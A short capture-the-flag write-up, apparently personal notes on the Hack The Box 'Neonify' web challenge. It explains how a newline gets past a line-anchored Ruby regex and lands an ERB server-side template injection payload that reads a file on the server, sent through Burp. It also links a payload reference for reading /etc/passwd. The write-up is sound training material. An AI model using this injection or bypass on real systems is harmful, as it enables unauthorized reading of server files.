
2024-09-21 18:51

Source: #htb #web 

Tags: [[Server-side template injection (SSTI)]]

Source Code Snippet - 
```ruby
if params[:neon] =~ /^[0-9a-z ]+$/i  
	@neon = ERB.new(params[:neon]).result(binding)  
else  
	@neon = "Malicious Input Detected"  
end
```

> And also, there is interesting situation. Even if you can use `%` in request , you can't use it in browser. you still will get “**Malicious Input Detected**” message.
> 
> But when you use it in **Burp suite** :
> You will see that we get “**Invalid query parameters: invalid %-encoding (a %)**” message.  
> It means something is wrong in our encoding but it still allows to send `%`

We send the request in burp w payload (url encode this)-  
```ruby
a  
<%= File.open('flag.txt').read %>
```

we need to pass the main payload in a new line . Why ?
in the above code `@neon` gets the parameter which we input and sends it to `index.erb`
If we want to run this code, In this code,  :

```html
<%= File.open('flag.txt').read %>
```

we have to pass new line like this :

```html
<h1 class="glow"><%= @neon  
<%= File.open('flag.txt').read %>%></h1>
```

And we can't leave `@neon` empty , that's why we write it like :

```html
<h1 class="glow"><%= a  
<%= File.open('flag.txt').read %>%></h1>
```

We need to use new line, but we cant use `/n`, we need to encode `/n` too.
do `/n` encoding in burps decoder or just go to [this website](https://www.urlencoder.org/) and encode it w/o `/n`

### References

SSTI for apps written in Ruby  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---retrieve-etcpasswd

https://medium.com/@nurlanisazade/hack-the-box-neonify-walkthrough-guided-mode-cbd8d71962f9